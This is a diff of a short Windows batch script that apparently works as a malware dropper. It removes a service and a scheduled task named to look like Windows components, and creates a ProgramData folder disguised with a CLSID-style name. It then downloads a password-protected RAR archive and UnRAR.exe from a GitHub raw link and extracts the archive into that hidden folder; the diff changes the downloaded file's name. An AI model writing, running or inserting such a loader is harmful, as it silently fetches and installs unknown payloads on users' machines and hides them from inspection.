@@ -1,7 +1,7 @@
 sc delete Help
 schtasks /Delete /TN "\Windows\Help" /F
 mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
-%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\pac.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
 %WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/1/UnRAR.exe
 
 "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" x -y -o+ -p369852147 "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\"
